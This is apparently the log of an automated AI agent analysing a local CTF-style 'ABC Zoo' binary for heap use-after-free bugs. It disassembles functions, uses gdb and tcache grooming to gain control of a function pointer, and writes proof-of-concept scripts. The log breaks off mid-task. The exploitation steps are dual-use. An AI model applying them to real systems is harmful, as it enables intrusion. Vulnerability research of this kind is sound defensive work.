19:21:15 [impact:BUG-001] ← GLM(7.9s): 调工具[gdb_run]
19:21:15 [impact:BUG-001] 现在让我使用 gdb 来验证 tcache 填充方法。我需要在 `call rdx` (0x4018bf) 处设置断点，并检查 rdx 是否等于 0x4141414141414141：
19:21:15 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x4018bf; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:21:16 [impact:BUG-001]   ← gdb_run(0.2s): after vfork from child process 19584] ⏎ 2026/09/08 19:21.16: Welcome to ABC Zoo!!! ⏎ [Detaching after vfork from child process 19587] ⏎ 2026/09/08 19:...(4206 chars)
19:21:16 [impact:BUG-001] → 调用 GLM...
19:21:22 [impact:BUG-001] ← GLM(6.5s): 调工具[gdb_run]
19:21:22 [impact:BUG-001] **突破！** tcache 填充方法生效了！gdb 显示： - `rdx = 0x4141414141414141`（我们受控的函数指针值！） - `rdi = 0x4242424242424242`（我们受控的名称指针值！） - 内存访问在 0x4242424242424242 处失败（无法访问
19:21:22 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x4018bf; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:21:22 [impact:BUG-001]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3066 chars)
19:21:22 [impact:BUG-001] → 调用 GLM...
19:22:45 [impact:BUG-001] ← GLM(82.9s): 调工具[write_file]
19:22:45 [impact:BUG-001] 简单的 UAF 没有触发断点，因为 `zoo[0]`（计数）在移除后变为了 0，并且 `report_name` 会检查 `zoo[0] > 0`，由于计数已递减，该检查失败。因此，简单的 UAF 被计数检查阻止了。但是 tcache-fill 方法之所以有效，是因为我们添加了 4 个动物，移除了 
19:22:45 [impact:BUG-001]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nS3 Primitive Verification PoC for BUG-001\nHEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_NULLIFIED\n\nThis PoC)
19:22:45 [impact:BUG-001]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py
19:22:45 [impact:BUG-001] → 调用 GLM...
19:22:49 [impact:BUG-001] ← GLM(4.0s): 调工具[run_script]
19:22:49 [impact:BUG-001]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-001.py", "timeout": 30})
19:22:49 [impact:BUG-001]   ← run_script(0.3s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-001: HEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_...(1911 chars)
19:22:49 [impact:BUG-001] → 调用 GLM...
19:22:55 [impact:BUG-001] ← GLM(5.5s): 调工具[gdb_run]
19:22:55 [impact:BUG-001] 所有三个原语均已验证： - **PRIM-001 (HEAP_OBJECT_CONTROL)**：已验证 - rc=-11 (SIGSEGV)，释放的结构体内存被攻击者控制的数据重用 - **PRIM-002 (FUNCTION_POINTER_CONTROL)**：已验证 - gdb 显示 rdx
19:22:55 [impact:BUG-001]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *0x4018bf; run < /work/workspace/0019-2022-35-uaf-20260908-191003)
19:22:55 [impact:BUG-001]   ← gdb_run(0.2s): ome to ABC Zoo!!! ⏎ [Detaching after vfork from child process 20177] ⏎ 2026/09/08 19:22.55: 1) Add animal ⏎ [Detaching after vfork from child process ...(4212 chars)
19:22:55 [impact:BUG-001] → 调用 GLM...
19:23:01 [impact:BUG-001] ← GLM(5.5s): 调工具[ls]
19:23:01 [impact:BUG-001] 这证实了一切： - 断点在 0x4018bf 处触发 (call rdx) - `continue` 导致 SIGSEGV，因为调用 0x4141414141414141 会崩溃 - `rip = 0x4018bf` (崩溃发生在 call rdx 指令处) - `rdx = 0x414141414
19:23:01 [impact:BUG-001]   → 工具 ls({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003"})
19:23:01 [impact:BUG-001]   ← ls(0.0s): ['/work/workspace/0019-2022-35-uaf-20260908-191003/core.19800', '/work/workspace/0019-2022-35-uaf-20260908-191003/full_run.log', '/work/workspace/0019...(679 chars)
19:23:01 [impact:BUG-001] → 调用 GLM...
19:25:40 [impact:BUG-001] ← GLM(159.7s): 调工具[submit_final_result]
19:25:40 [impact:BUG-001] 很好，PoC 脚本已就位。现在让我提交最终报告：
19:25:40 [impact:BUG-001] ✓ submit_final_result 收到最终报告（PrimitiveReport 校验通过，18028 chars）
19:25:40 [impact:BUG-001] → 调用 GLM...
19:25:49 [impact:BUG-001] ← GLM(9.1s)
19:25:49 [impact:BUG-001] S3 Primitive 分析与验证已完成。以下是验证内容的总结：  **BUG-001: HEAP_USE_AFTER_FREE_DANGLING_POINTER_NOT_NULLIFIED**  **3 个原语已验证：**  1. **PRIM-001 (HEAP_OBJECT_CONTROL)
19:25:50 === impact (bug_id=BUG-002) ===
19:25:50 [impact:BUG-002] → 调用 GLM...
19:25:54 [impact:BUG-002] ← GLM(4.0s): 调工具[disassemble, disassemble, disassemble]
19:25:54 [impact:BUG-002] 我将分析 BUG-002 (通过释放的名称指针进行 UAF 信息泄露)。让我先从理解二进制文件和漏洞链开始。
19:25:54 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "report_name"})
19:25:54 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "remove_animal"})
19:25:54 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "print"})
19:25:54 [impact:BUG-002]   ← disassemble(0.0s): 00000000004017bf <report_name>: ⏎   4017bf:	endbr64 ⏎   4017c3:	push   rbp ⏎   4017c4:	mov    rbp,rsp ⏎   4017c7:	sub    rsp,0x10 ⏎   4017cb:	mov    r...(2735 chars)
19:25:54 [impact:BUG-002]   ← disassemble(0.0s): 0000000000401290 <print>: ⏎   401290:	endbr64 ⏎   401294:	push   rbp ⏎   401295:	mov    rbp,rsp ⏎   401298:	sub    rsp,0x10 ⏎   40129c:	mov    QWORD P...(597 chars)
19:25:54 [impact:BUG-002]   ← disassemble(0.0s): 0000000000401677 <remove_animal>: ⏎   401677:	endbr64 ⏎   40167b:	push   rbp ⏎   40167c:	mov    rbp,rsp ⏎   40167f:	sub    rsp,0x10 ⏎   401683:	mov   ...(3192 chars)
19:25:54 [impact:BUG-002] → 调用 GLM...
19:25:58 [impact:BUG-002] ← GLM(4.2s): 调工具[disassemble, disassemble]
19:25:58 [impact:BUG-002] 现在让我来理解完整的调用链。让我再看看 `add_animal` 和 `speak` 函数。
19:25:58 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal"})
19:25:58 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "speak"})
19:25:58 [impact:BUG-002]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(4020 chars)
19:25:58 [impact:BUG-002]   ← disassemble(0.0s): 00000000004012cd <speak>: ⏎   4012cd:	endbr64 ⏎   4012d1:	push   rbp ⏎   4012d2:	mov    rbp,rsp ⏎   4012d5:	sub    rsp,0x10 ⏎   4012d9:	mov    QWORD P...(326 chars)
19:25:58 [impact:BUG-002] → 调用 GLM...
19:26:01 [impact:BUG-002] ← GLM(3.6s): 调工具[disassemble, list_strings]
19:26:01 [impact:BUG-002] 现在让我来了解一下完整的调用链。让我查看 `add_animal` 的剩余部分，并检查 `rodata` 中的字符串。
19:26:01 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 50})
19:26:01 [impact:BUG-002]   → 工具 list_strings({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "filter": "%s"})
19:26:01 [impact:BUG-002]   ← list_strings(0.0s): /usr/bin/date +"%Y/%m/%d %H:%M.%S" | tr -d ' ⏎ : %s ⏎ 
19:26:01 [impact:BUG-002]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(1981 chars)
19:26:01 [impact:BUG-002] → 调用 GLM...
19:26:03 [impact:BUG-002] ← GLM(2.1s): 调工具[read_file]
19:26:03 [impact:BUG-002] 现在让我查看 `add_animal` 的剩余部分，以了解 `read` 和 `slot` 存储逻辑：
19:26:03 [impact:BUG-002]   → 工具 read_file({"file_path": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "limit": 1})
19:26:03 [impact:BUG-002]   ← read_file(0.0s): Error: Error reading file '/work/workspace/0019-2022-35-uaf-20260908-191003/target': 'utf-8' codec can't decode byte 0x90 in position 24: invalid star...(156 chars)
19:26:03 [impact:BUG-002] → 调用 GLM...
19:26:07 [impact:BUG-002] ← GLM(3.6s): 调工具[disassemble]
19:26:07 [impact:BUG-002]   → 工具 disassemble({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "function": "add_animal", "lines": 200})
19:26:07 [impact:BUG-002]   ← disassemble(0.0s): 000000000040143b <add_animal>: ⏎   40143b:	endbr64 ⏎   40143f:	push   rbp ⏎   401440:	mov    rbp,rsp ⏎   401443:	sub    rsp,0x20 ⏎   401447:	mov    ra...(5526 chars)
19:26:07 [impact:BUG-002] → 调用 GLM...
19:26:14 [impact:BUG-002] ← GLM(7.1s): 调工具[probe_io]
19:26:14 [impact:BUG-002] 现在我已经完全理解了。让我分析一下 BUG-002 的漏洞链：  **BUG-002 漏洞链：** 1. `add_animal` 创建一个动物：结构体 (24B) + 名称缓冲区 (用户大小 0-63) 2. `remove_animal` 释放 `struct->name` 和 `struct`
19:26:14 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "steps": "[{\"recv_until\": \"0\", \"send\": \"1\"}, {\"recv_until\": \":\", \"s)
19:26:14 [impact:BUG-002]   ← probe_io(0.1s): RECV: b'20' ⏎ SEND: '1' ⏎ RECV: b'26/09/08 19:' ⏎ SEND: '1' ⏎ RECV: b'26.14:' ⏎ SEND: '16' ⏎ RECV: b' Welcome to ABC Zoo!!!\n2026/09/08 19:' ⏎ SEND: '...(177 chars)
19:26:14 [impact:BUG-002] → 调用 GLM...
19:26:20 [impact:BUG-002] ← GLM(5.4s): 调工具[probe_io]
19:26:20 [impact:BUG-002] I/O 时序有点棘手。让我使用一种更简单的方法——直接通过 stdin 管道传输所有输入：
19:26:20 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "input": "1\n1\n16\nAAAA\n3\n0\n0\n"})
19:26:20 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 3230 3236 2f30 392f 3038 2031 393a 3236  2026/09/08 19:26 ⏎ 00000010: 2e32 303a 2057 656c 636f 6d65 2074 6f20  .20: Welcome to  ⏎ 00000020: ...(2800 chars)
19:26:20 [impact:BUG-002] → 调用 GLM...
19:26:23 [impact:BUG-002] ← GLM(3.4s): 调工具[probe_io]
19:26:23 [impact:BUG-002] 我可以看到菜单结构。`read()` 调用读取了 "AAAA"，但末尾的 `3\n0\n0` 没有被正确处理。让我更仔细地查看一下输出——我看到 "Animal is added to zone 0"，然后菜单再次出现。接着 `3` (report_name) 被选中，但随后出现了 `??` 输出。
19:26:23 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "input": "1\n1\n16\nAAAAAAAAAAAAAAAA\n3\n0\n0\n"})
19:26:23 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 3230 3236 2f30 392f 3038 2031 393a 3236  2026/09/08 19:26 ⏎ 00000010: 2e32 333a 2057 656c 636f 6d65 2074 6f20  .23: Welcome to  ⏎ 00000020: ...(2800 chars)
19:26:23 [impact:BUG-002] → 调用 GLM...
19:26:27 [impact:BUG-002] ← GLM(4.3s): 调工具[probe_io]
19:26:27 [impact:BUG-002] 我看到 "Animal is added to zone 0"，然后菜单再次出现。接着 `3` (report_name) 被选中，但输出被截断了。让我看看尾部：
19:26:27 [impact:BUG-002]   → 工具 probe_io({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "input": "1\n1\n16\nAAAAAAAAAAAAAAAA\n3\n0\n0\n", "max_lines": 80})
19:26:28 [impact:BUG-002]   ← probe_io(0.0s): 00000000: 3230 3236 2f30 392f 3038 2031 393a 3236  2026/09/08 19:26 ⏎ 00000010: 2e32 373a 2057 656c 636f 6d65 2074 6f20  .27: Welcome to  ⏎ 00000020: ...(3975 chars)
19:26:28 [impact:BUG-002] → 调用 GLM...
19:26:53 [impact:BUG-002] ← GLM(25.3s): 调工具[gdb_run]
19:26:53 [impact:BUG-002] 现在我可以看到完整的流程了。在偏移量 0x2a0 处，我看到了 "AAAAAAAAAAAAAAAA" —— 这是 `report_name` 的输出，它调用了 `speak` → `print` → `printf(": %s\n", name_ptr)`，打印出了名称。这证实了该路径是有效的。  
19:26:53 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; x/3gx $rbp-0x10; x/3gx *(long*)($rbp-0x10)
19:26:53 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x401661 ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(1861 chars)
19:26:53 [impact:BUG-002] → 调用 GLM...
19:27:02 [impact:BUG-002] ← GLM(8.8s): 调工具[gdb_run]
19:27:02 [impact:BUG-002] 我现在可以看到堆布局了： - 结构体位于 0x4052a0：`[0x4012cd (speak), 0x0 (type), 0x4052c0 (name_ptr)]` - 名称缓冲区位于 0x4052c0  现在让我编写一个 PoC 来验证 BUG-002 的信息泄露。计划如下： 1. 添加一个名称
19:27:02 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; info reg rax; x/3gx 0x4040c8; continue)
19:27:02 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(2425 chars)
19:27:02 [impact:BUG-002] → 调用 GLM...
19:27:11 [impact:BUG-002] ← GLM(8.8s): 调工具[gdb_run]
19:27:11 [impact:BUG-002] 太棒了！关键发现：在 `remove_animal` 执行之后，`zoo[0]` (0x4040c8) 仍然包含 `0x00000000004052a0` —— 悬空指针并没有被置空！结构体内存位于 0x4052a0，名称缓冲区位于 0x4052c0。  现在让我验证一下信息泄露。我需要检查在释放后
19:27:11 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove: struct at 0)
19:27:11 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(2629 chars)
19:27:11 [impact:BUG-002] → 调用 GLM...
19:28:32 [impact:BUG-002] ← GLM(81.1s): 调工具[write_file]
19:28:32 [impact:BUG-002] 这非常有启发性！在 `remove_animal` 之后：  **位于 0x4052a0 的结构体内存（已释放）：** - `struct+0x00` = `0x00000000004056c5` —— 这不再是 `speak` (0x4012cd)！它已被 tcache 元数据覆盖。等等，实际上结
19:28:32 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER\n\nPrimitive: INFO_LEAK / RELATIVE_READ\n- )
19:28:32 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:28:32 [impact:BUG-002] → 调用 GLM...
19:28:38 [impact:BUG-002] ← GLM(6.2s): 调工具[gdb_run]
19:28:38 [impact:BUG-002] 让我采取一种更实际的方法。首先，让我使用 gdb 来验证最简单的信息泄露路径——即 `report_name` 读取已释放的结构体内存，并且崩溃地址揭示了堆元数据：
19:28:38 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0x100; run; printf \"=== At call rdx (report_name+0x)
19:28:38 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3171 chars)
19:28:38 [impact:BUG-002] → 调用 GLM...
19:28:45 [impact:BUG-002] ← GLM(6.8s): 调工具[gdb_run]
19:28:45 [impact:BUG-002] 断点未命中。问题在于在 `remove_animal` 之后，`zoo` 计数减为 0，因此 `report_name` 的计数检查（`zoo[0] > 0`）失败，并打印 "No animal in the zoo."。悬空指针虽然存在，但计数检查阻止了对它的访问。  这是一个关键发现！`repo
19:28:45 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0x100; run; printf \"=== At call rdx ===\\n\"; info )
19:28:45 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3788 chars)
19:28:45 [impact:BUG-002] → 调用 GLM...
19:29:04 [impact:BUG-002] ← GLM(19.2s): 调工具[gdb_run]
19:29:04 [impact:BUG-002] 太棒了！这是一个关键发现！断点命中了，我们能看到：  1. **rdx = 0x4056c5** —— 这是从 `struct+0x00` 加载的“函数指针”。它不是 `speak` (0x4012cd) —— 它已被 tcache 元数据覆盖！这是经过异或（XOR）处理的 tcache `next
19:29:04 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; printf \"=== After add A (zone 0) ===\\n\)
19:29:04 [impact:BUG-002]   ← gdb_run(0.1s): ter vfork from child process 20990] ⏎ 2026/09/08 19:29.04: How long is the name? (max: 64 characters) ⏎ > [Detaching after vfork from child process 20...(4216 chars)
19:29:04 [impact:BUG-002] → 调用 GLM...
19:29:20 [impact:BUG-002] ← GLM(16.1s): 调工具[gdb_run]
19:29:20 [impact:BUG-002] 现在我可以看到布局了： - **Animal A**: struct at 0x4052a0, name at 0x4052c0 (name_length=32, 0x30 bin) - **Animal B**: struct at 0x4052f0, name at 0x405310 (name
19:29:20 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove A: zoo[0] da)
19:29:21 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3759 chars)
19:29:21 [impact:BUG-002] → 调用 GLM...
19:29:43 [impact:BUG-002] ← GLM(22.4s): 调工具[gdb_run]
19:29:43 [impact:BUG-002] 现在我可以清楚地看到： - **A struct (freed) at 0x4052a0**: `[0x405 (tcache next XOR'd), tcache_key, 0x4052c0 (original name ptr still intact!)]` - **A name (free
19:29:43 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; printf \"=== A struct at 0x4052a0, A name)
19:29:43 [impact:BUG-002]   ← gdb_run(0.1s): ss 21214] ⏎ 2026/09/08 19:29.43: 2) Remove animal ⏎ [Detaching after vfork from child process 21217] ⏎ 2026/09/08 19:29.43: 3) Report animal Name ⏎ [D...(4210 chars)
19:29:43 [impact:BUG-002] → 调用 GLM...
19:30:26 [impact:BUG-002] ← GLM(42.6s): 调工具[write_file]
19:30:26 [impact:BUG-002] `continue` 命令导致程序退出。问题在于 `remove_animal` 上的断点在函数返回时被命中，但随后的 `continue` 命令导致程序继续执行到退出。让我重新构建一下 gdb 命令。我需要在 `remove_animal` 的末尾设置断点，并在那里进行检查，然后不要继续执行到退出
19:30:26 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER\n\nPrimitive: INFO_LEAK (via UAF read of fr)
19:30:26 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:30:26 [impact:BUG-002] → 调用 GLM...
19:30:29 [impact:BUG-002] ← GLM(3.3s): 调工具[run_script]
19:30:29 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py", "timeout": 15})
19:30:29 [impact:BUG-002]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-002: UAF Info Leak via Freed Name Pointer ⏎ ==...(506 chars)
19:30:29 [impact:BUG-002] → 调用 GLM...
19:30:57 [impact:BUG-002] ← GLM(28.3s): 调工具[write_file]
19:30:57 [impact:BUG-002] 程序没有崩溃——它返回了 0。这意味着 `report_name` 没有触发崩溃。让我检查一下原因——计数检查！在移除 A 和 B 之后，计数为 0，所以 `report_name` 会打印 "No animal in the zoo" 并退出。我需要保持计数 > 0。  让我修改 PoC 以添加第
19:30:57 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER\n\nPrimitive: INFO_LEAK / RELATIVE_READ via)
19:30:57 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:30:57 [impact:BUG-002] → 调用 GLM...
19:30:59 [impact:BUG-002] ← GLM(2.2s): 调工具[run_script]
19:30:59 [impact:BUG-002]   → 工具 run_script({"path": "/work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py", "timeout": 15})
19:31:00 [impact:BUG-002]   ← run_script(0.1s): rc=0 ⏎ --- stdout (summarized) --- ⏎ ============================================================ ⏎ BUG-002: UAF Info Leak via Freed Name Pointer ⏎ ==...(1307 chars)
19:31:00 [impact:BUG-002] → 调用 GLM...
19:31:08 [impact:BUG-002] ← GLM(8.7s): 调工具[gdb_run]
19:31:08 [impact:BUG-002] PRIM-001 已验证：程序在访问已释放槽位上的 `report_name` 时，因 SIGSEGV (rc=-11) 而崩溃。崩溃原因是 `struct+0x00` 包含了 tcache 的 next 指针（堆元数据），而不是 `speak`。  现在我需要验证 PRIM-002：基于 prin
19:31:08 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; printf \"=== A added: struct=0x4052a0, na)
19:31:08 [impact:BUG-002]   ← gdb_run(0.1s): ove animal ⏎ [Detaching after vfork from child process 21600] ⏎ 2026/09/08 19:31.08: 3) Report animal Name ⏎ [Detaching after vfork from child process...(4212 chars)
19:31:08 [impact:BUG-002] → 调用 GLM...
19:31:15 [impact:BUG-002] ← GLM(6.5s): 调工具[gdb_run]
19:31:15 [impact:BUG-002] 问题在于 `continue` 命令导致程序运行到退出。我需要一种不同的 gdb 方法。让我使用一个在关键点停止并检查内存的单条 gdb 命令，而不继续执行到退出。  让我尝试一种不同的策略——在 `report_name` 中的 `call rdx` 指令处设置断点，并检查所有内容：
19:31:15 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *report_name+0x100; run; printf \"=== UAF hit: report_name on fre)
19:31:15 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4018bf ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(4142 chars)
19:31:15 [impact:BUG-002] → 调用 GLM...
19:31:49 [impact:BUG-002] ← GLM(33.9s): 调工具[gdb_run]
19:31:49 [impact:BUG-002] 这非常有价值！现在我已经掌握了所有证据：  **在 `call rdx` (report_name+0x100 = 0x4018bf) 处的 GDB 证据：**  1. **rax = 0x4052c0** — 这是来自 `zoo[0]` 的结构体指针。等等，`zoo[0]` = 0x4052a0，
19:31:49 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x226; run; printf \"=== A: struct at ===\\n\"; x/gx )
19:31:49 [impact:BUG-002]   ← gdb_run(0.1s):  ⏎ > [Detaching after vfork from child process 21862] ⏎ 2026/09/08 19:31.49: How long is the name? (max: 64 characters) ⏎ > [Detaching after vfork fro...(4224 chars)
19:31:49 [impact:BUG-002] → 调用 GLM...
19:32:26 [impact:BUG-002] ← GLM(37.4s): 调工具[gdb_run]
19:32:26 [impact:BUG-002] 我明白了——在 `remove_animal` 之后，结构体内存显示 `0x4012cd` (speak) 仍然在 struct+0x00 处！等等，这很令人惊讶。让我重新检查一下：  ``` A struct (freed): 0x4052a0: 0x00000000004012cd  0x000
19:32:26 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove A (at remove)
19:32:27 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(3150 chars)
19:32:27 [impact:BUG-002] → 调用 GLM...
19:32:38 [impact:BUG-002] ← GLM(11.7s): 调工具[gdb_run]
19:32:38 [impact:BUG-002] 现在我已经掌握了确凿的证据：  **在 `remove_animal` 返回后（在 `remove_animal+0x146` 处的断点）：**  1. **`zoo[0]` = 0x4052a0** — 悬空指针没有被置为 NULL！ 2. **`zoo count` = 1** — 计数从 2 
19:32:38 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove A ===\\n\"; )
19:32:38 [impact:BUG-002]   ← gdb_run(0.1s): Breakpoint 1 at 0x4017bd ⏎ [Thread debugging using libthread_db enabled] ⏎ Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1". ...(4202 chars)
19:32:38 [impact:BUG-002] → 调用 GLM...
19:32:58 [impact:BUG-002] ← GLM(19.2s): 调工具[gdb_run]
19:32:58 [impact:BUG-002] 现在我已经掌握了全貌：  **在移除 A 和 B 之后：**  **0x30 tcache bin (名称缓冲区):** B_name(0x405310) → A_name(0x4052c0) - B_name 的 tcache next = 0x4056c5 = XOR(A_name_addr, 
19:32:58 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *remove_animal+0x146; run; printf \"=== After remove A ===\\n\"; )
19:32:58 [impact:BUG-002]   ← gdb_run(0.1s): after vfork from child process 22204] ⏎ 2026/09/08 19:32.58: Welcome to ABC Zoo!!! ⏎ [Detaching after vfork from child process 22207] ⏎ 2026/09/08 19:...(4212 chars)
19:32:58 [impact:BUG-002] → 调用 GLM...
19:33:19 [impact:BUG-002] ← GLM(21.5s): 调工具[gdb_run]
19:33:19 [impact:BUG-002] 很好。现在我可以看到在两次移除之后，添加了 `name_length=24` 的动物 C。C 的名称缓冲区 `malloc(24)` → 0x20 bin → 弹出 B_struct (0x4052f0)。C 的结构体 `malloc(0x18)` → 0x20 bin → 弹出 A_struct 
19:33:19 [impact:BUG-002]   → 工具 gdb_run({"binary": "/work/workspace/0019-2022-35-uaf-20260908-191003/target", "commands": "b *add_animal+0x6d; b *add_animal+0x226; run; printf \"=== A: mallo)
19:33:19 [impact:BUG-002]   ← gdb_run(0.1s): 19: Name of animal? ⏎ > > [DEBUG] Animal is added to zone 0 ⏎  ⏎ Breakpoint 2, 0x0000000000401661 in add_animal () ⏎ === A: after add (struct+name) ==...(4222 chars)
19:33:19 [impact:BUG-002] → 调用 GLM...
19:34:05 [impact:BUG-002] ← GLM(46.1s): 调工具[write_file]
19:34:05 [impact:BUG-002] 现在我可以看到布局了： - **C struct** 位于 0x4052f0（重用了 B 的旧结构体内存） - **C name** 位于 0x4052a0（重用了 A 的旧结构体内存）—— 包含 "XXXXXXXX..." - **zoo[0]** = 0x4052a0（悬空指针，指向 C 的名称
19:34:05 [impact:BUG-002]   → 工具 write_file({"content": "#!/usr/bin/env python3\n\"\"\"\nBUG-002: HEAP_USE_AFTER_FREE_INFO_LEAK_VIA_FREED_NAME_POINTER\n\nPrimitive Analysis:\n  BUG: remove_anima)
19:34:05 [impact:BUG-002]   ← write_file(0.0s): Updated file /work/workspace/0019-2022-35-uaf-20260908-191003/poc-BUG-002.py
19:34:05 [impact:BUG-002] → 调用 GLM...
